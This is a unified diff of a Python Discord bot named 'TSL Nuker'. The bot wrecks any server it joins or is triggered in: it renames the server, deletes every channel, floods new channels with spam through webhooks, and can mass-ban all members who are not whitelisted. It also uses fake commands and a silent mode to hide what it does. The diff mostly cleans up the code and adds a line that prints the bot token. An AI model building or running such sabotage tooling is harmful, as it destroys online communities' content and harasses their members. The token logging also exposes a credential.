@@ -1,3 +1,9 @@
+import asyncio
+import sys
+
+if sys.platform == 'win32':
+    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
 import discord
 from discord import Intents, Permissions
 from discord.ext import commands
@@ -7,54 +13,37 @@ import configparser
 from colorama import Fore, init
 import os
 from os import system, name
-import fade  # Falls "fade" eine separate Bibliothek ist, die du verwendest
-import asyncio
+import fade  
 
-def clear():
-    if name == 'nt':
-        _ = system('cls')
-    else:
-        _ = system('clear')
-
-# Initialisiere Colorama
 init(autoreset=True)
 
-# Definiere den Dateinamen und Pfad zur Konfigurationsdatei
 config_file_name = 'main_cfg.ini'
 config_file_path = Path(r'Configs\\main_cfg.ini')
-# Überprüfe und erstelle notwendige Dateien
+
 if not config_file_path.is_file():
     print(f'{Fore.RED}[ERROR]' + f'{Fore.RESET} Config file not found at {config_file_path}.')
     input('Press Enter to exit...')
     quit()
 
-# Initialisiere den ConfigParser und lade die Konfigurationsdatei
 config = configparser.ConfigParser()
 config.read(config_file_path)
 
-# Hol dir die Werte aus der Konfigurationsdatei
 token = config['BOT_CFG']['token']
 prefix = config['BOT_CFG']['prefix']
-# ... (Weitere Konfigurationsoptionen hier hinzufügen)
 
-# Version manuell festlegen (ersetze '1.0' durch die gewünschte Version)
+print(f"Loaded Token: {token}")
+
 nversion = '1.0'
 
-# Falls du die Versionsnummer anzeigen möchtest, füge den folgenden Code hinzu:
-# os.system(f"title TSL Nuker - v{nversion} - Made By TSL Tobi and TSL Max")
-
-# Paths
 configs_dir = Path('Configs') 
 configs_dir.mkdir(parents=True, exist_ok=True)
 
-# Erstelle die Dateien, wenn sie nicht existieren
 file_paths_to_create = ['list_of_fake_commands.txt', 'nuker_reactions_to_fake_commands.txt']
 for file_path in file_paths_to_create:
     file_path_full = configs_dir / file_path
     if not file_path_full.is_file():
         open(file_path_full, 'w+').close()
 
-# Lese die Whitelisted People
 ptwlp = Path('Configs\\whitelisted_people.txt')
 if not ptwlp.is_file():
     print(f'{Fore.RED}[ERROR]' + f'{Fore.RESET} File not found at {ptwlp}.')
@@ -64,15 +53,13 @@ else:
     with open(ptwlp, 'r') as list_of_wlp:
         whitelisted_ppls = list_of_wlp.read().splitlines()
 
-# Überprüfe, ob die Konfigurationsdatei gefunden wird
 if config_file_path.is_file():
     print(f'{Fore.YELLOW}[Config System]{Fore.RESET} Config found!')
     print(f'{Fore.CYAN}[BOT]{Fore.RESET} Starting...')
 else:
     print(f'{Fore.RED}[ERROR]{Fore.RESET} Config not found! Creating a new config...')
     config['BOT_CFG'] = {'prefix': '!',
-                         'token': 'bot token here',
-                         # Füge hier weitere Konfigurationsoptionen hinzu
+                         'token': 'bot token here', # was to lazzy to add more
                          }
     config['Nuker mode'] = {'Mode': '1'}
     config['Fake commands'] = {'Enabled?': '0'}
@@ -83,11 +70,9 @@ else:
     input('Press Enter to close the program...')
     quit()
 
-# Load the icon
 with open('Configs\\icon.png', 'rb') as f:
     icona = f.read()
 
-# Read additional configuration values
 spamtext = config['BOT_CFG']['spamtext']
 ac_name = config['BOT_CFG']['ac_name']
 ac_type = int(config['BOT_CFG']['ac_type'])
@@ -104,7 +89,12 @@ nuker_mode = str(config['Nuker mode']['Mode'])
 ban_people = str(config['BOT_CFG']['ban people while i nuking the server?'])
 is_fake_commands_enabled = str(config['Fake commands']['Enabled?'])
 
-# ...
+
+def clear():
+    if name == 'nt':
+        _ = system('cls')
+    else:
+        _ = system('clear')
 
 intents = Intents.default()
 intents.members = True
@@ -116,10 +106,12 @@ bot_started_text = f'{Fore.MAGENTA}Bot launched successfully!'
 def login():
     try:
         client.run(token)
-    except:
+    except discord.LoginFailure:
         print(f'{Fore.RED}[ERROR]{Fore.RESET} Invalid token. Please change the token and try again.')
-        input('Press Enter to exit...')
-        quit()
+    except Exception as e:
+        print(f'{Fore.RED}[ERROR]{Fore.RESET} An unexpected error occurred: {e}')
+    input('Press Enter to exit...')
+    quit()
 
 
 async def rmm():
@@ -154,9 +146,8 @@ async def on_command_error(ctx, error):
     await asyncio.sleep(1)
 
 
-
 @client.event
-async def on_ready():
+async def on_ready(): 
     if ac_type == 1 and silent_mode == 0:
         await client.change_presence(activity=discord.Game(name=ac_name))
     elif ac_type == 2 and silent_mode == 0:
@@ -179,8 +170,6 @@ async def on_command_error(ctx, error):
 async def on_guild_join(ctx):
     if nuker_mode == '2':
         await ctx.edit(name=srvn, icon=icona)
-        for rl in ctx.roles:
-            create_task(killobject(obj=rl))
         for channel in ctx.channels:
             create_task(killobject(obj=channel))
         if ban_people == '1':
@@ -217,8 +206,8 @@ async def createchannel(ctx, name):
 
 async def createchannel2(ctx, name):
     try:
-        chan = await ctx.create_text_channel(name=name)
-        wb = await chan.create_webhook(name=wbn, avatar=icona)
+        chan = await ctx.create_text_channel(name=name) 
+        wb = await chan.create_webhook(name=wbn, avatar=icona) # this will ratelimit you pretty fast
         create_task(sendch(ctx, wb, count=howmp))
     except:
         pass
@@ -243,8 +232,6 @@ async def start(ctx):
     if nuker_mode == '1':
         await ctx.message.delete()
         await ctx.guild.edit(name=srvn, icon=icona)
-        for rl in ctx.guild.roles:
-            create_task(killobject(obj=rl))
         for channel in ctx.guild.channels:
             create_task(killobject(obj=channel))
         if ban_people == '1':
@@ -295,6 +282,7 @@ async def banallmode2(ctx):
             await not_wl_ppl.ban(reason=br, delete_message_days=7)
         except:
             pass
+
 
 
 raw_nuker_logo = '''
